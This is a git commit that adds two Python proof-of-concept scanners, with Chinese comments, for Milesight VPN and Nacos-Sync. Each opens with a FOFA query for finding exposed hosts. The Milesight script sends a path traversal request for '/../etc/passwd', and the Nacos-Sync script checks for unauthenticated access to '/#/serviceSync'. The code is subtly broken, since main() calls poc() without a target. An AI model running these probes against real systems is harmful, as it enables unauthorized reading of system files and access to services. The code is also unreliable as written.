e98dea01183161a25a35c7a75ecfbb9c0215e3f4
wsgdr7 <3074394329@qq.com>
2024-07-27 14:39:41 +0800

    Add files via upload

---
+++ Milesight VPN server.js 任意文件读取漏洞.py
@@ -0,0 +1,47 @@
+# fofa:web.body="MilesightVPN"
+#导包
+import requests,sys,argparse,json
+from multiprocessing.dummy import Pool
+#关闭警告
+requests.packages.urllib3.disable_warnings()
+#横幅
+def banner():
+    test = """
+       _____                _                        __ _ _      
+ |  __ \              | |                      / _(_) |     
+ | |__) |___  __ _  __| |   __ _ _ __  _   _  | |_ _| | ___ 
+ |  _  // _ \/ _` |/ _` |  / _` | '_ \| | | | |  _| | |/ _ \
+ | | \ \  __/ (_| | (_| | | (_| | | | | |_| | | | | | |  __/
+ |_|  \_\___|\__,_|\__,_|  \__,_|_| |_|\__, | |_| |_|_|\___|
+                                        __/ |               
+                                       |___/                
+
+                                                                                                                                
+"""
+    print(test)
+#主函数
+def main():
+    banner()
+    parser = argparse.ArgumentParser(description='Milesight VPN server.js 任意文件读取漏洞')
+    parser.add_argument('-url','--url',dest='url',type=str,help='input your url')
+    args = parser.parse_args()
+    if args.url:
+        poc()
+    else:
+        print(f'Usage:\n\t python3 {sys.argv[0]}-h')
+    
+
+
+#poc函数
+def poc(target):
+    payload = '/../etc/passwd'
+    res = requests.get(url=target + payload,verify=False)
+    if res.status_code == 200 and "0:0" in res.text:
+        print(f'[+]{target}存在漏洞')
+    else:
+        print(f'[-]{target}不存在漏洞')
+
+#函数入口
+if __name__ =='__main__':
+    main()
+
---
+++ Nacos-Sync未授权漏洞.py
@@ -0,0 +1,43 @@
+#fofa : title=="Nacos-Sync"
+#导包
+import requests,sys,argparse,json
+from multiprocessing.dummy import Pool
+#关闭警告
+requests.packages.urllib3.disable_warnings()
+#横幅
+def banner():
+    test = """ 
+ _     _      ____  _     _____  _     ____  ____  _  ____  _____ ____    ____  ____  ____  _____ ____  ____ 
+/ \ /\/ \  /|/  _ \/ \ /\/__ __\/ \ /|/  _ \/  __\/ \/_   \/  __//  _ \  /  _ \/   _\/   _\/  __// ___\/ ___\
+| | ||| |\ ||| / \|| | ||  / \  | |_||| / \||  \/|| | /   /|  \  | | \|  | / \||  /  |  /  |  \  |    \|    \
+| \_/|| | \||| |-||| \_/|  | |  | | ||| \_/||    /| |/   /_|  /_ | |_/|  | |-|||  \_ |  \_ |  /_ \___ |\___ |
+\____/\_/  \|\_/ \|\____/  \_/  \_/ \|\____/\_/\_\\_/\____/\____\\____/  \_/ \|\____/\____/\____\\____/\____/
+                                                                                                                     
+"""
+    print(test)
+#主函数
+def main():
+    banner()
+    parser = argparse.ArgumentParser(description='Nacos-Sync未授权漏洞')
+    parser.add_argument('-url','--url',dest='url',type=str,help='input your url')
+    args = parser.parse_args()
+    if args.url:
+        poc()
+    else:
+        print(f'Usage:\n\t python3 {sys.argv[0]}-h')
+    
+
+
+#poc函数
+def poc(target):
+    payload = '/#/serviceSync'
+    res = requests.get(url=target + payload,verify=False)
+    if res.status_code == 200:
+        print(f'[+]{target}存在漏洞')
+    else:
+        print(f'[-]{target}不存在漏洞')
+
+#函数入口
+if __name__ =='__main__':
+    main()
+
